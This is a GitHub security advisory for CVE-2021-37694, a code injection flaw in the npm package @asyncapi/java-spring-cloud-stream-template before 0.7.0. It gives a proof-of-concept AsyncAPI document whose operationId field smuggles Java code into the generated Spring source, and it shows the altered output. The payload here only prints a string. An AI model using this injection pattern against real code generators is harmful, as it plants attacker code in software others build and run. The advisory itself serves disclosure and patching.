# [H] Code injection issue for java-spring-cloud-stream-template

## Summary
Severity: High
Advisory: GHSA-xj6r-2jpm-qvxp
CVE: CVE-2021-37694
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2021-08-25
Source: https://github.com/advisories/GHSA-xj6r-2jpm-qvxp
Type: github-advisory

## Affected
- npm: `@asyncapi/java-spring-cloud-stream-template` — affected >=0 <0.7.0

## Details
The following was initially reported by @jonaslagoni:

Given the following command:
`ag ./dummy.json @asyncapi/java-spring-cloud-stream-template --force-write --output ./output`

With the following AsyncAPI document:
```json
{
  "asyncapi": "2.0.0",
  "info": {
    "title": "Streetlight",
    "version": "1.0.0"
  },
  "defaultContentType": "json",
  "channels": {
    "security/audit/channel": {
      "description": "Channel for the turn on command which should turn on the streetlight",
      "parameters": {
        "streetlight_id": {
          "description": "The ID of the streetlight",
          "schema": {
            "type": "string"
          }
        }
      },
      "publish": {
        "operationId": "test() { System.out.println(\"injected\"); return test(0); }\n public Consumer<CustomClass> someothername",
        "message": {
          "name": "TurnonCommand",
          "payload": {
            "$ref": "#/components/schemas/CustomClass"
          }
        }
      }
    }
  },
  "components": {
    "schemas" : {
      "CustomClass": {
        "type": "object",
        "properties": {
          "prop": { 
              "type": "string"
          }
        }
      }
    }
  }
}
```

Which changes the following output: 

```java
...
  @Bean
  public Consumer<CustomClass> test() {
    // Add business logic here.
    return null;
  }
...
```
To
```java
...
  @Bean
  public Consumer<CustomClass> test() { System.out.println("injected"); return someothername(); }
  public Consumer<CustomClass> someothername() {
    // Add business logic here.
    return null;
  }
...
```

## References
- https://github.com/asyncapi/java-spring-cloud-stream-template/security/advisories/GHSA-xj6r-2jpm-qvxp
- https://nvd.nist.gov/vuln/detail/CVE-2021-37694
- https://github.com/asyncapi/java-spring-cloud-stream-template
